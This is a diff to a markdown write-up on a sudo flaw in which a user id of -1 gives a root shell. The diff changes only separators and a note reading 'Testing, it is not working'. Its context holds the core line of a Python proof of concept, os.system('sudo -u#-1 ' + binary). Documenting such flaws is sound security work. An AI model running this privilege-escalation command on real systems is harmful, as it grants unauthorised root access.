@@ -48,10 +48,9 @@ Sudo doesn't check for the existence of the specified user id and executes the w
 and /bin/bash is executed with root permission
 Proof of Concept Code :
 
+--------------------------------------------------------------------------------------
 How to use :
 python3 sudo_exploit.py
-
-'''
 
 ```python
 #!/usr/bin/python3
@@ -80,8 +79,8 @@ print("Lets hope it works")
 
 os.system("sudo -u#-1 "+ binary)
 ```
-
-- Test and it is not work
+----------------------------------------------------------------------------------------------------
+- Testing,  it is not working
 ```bash
 $ python3 sudo.py
 ```
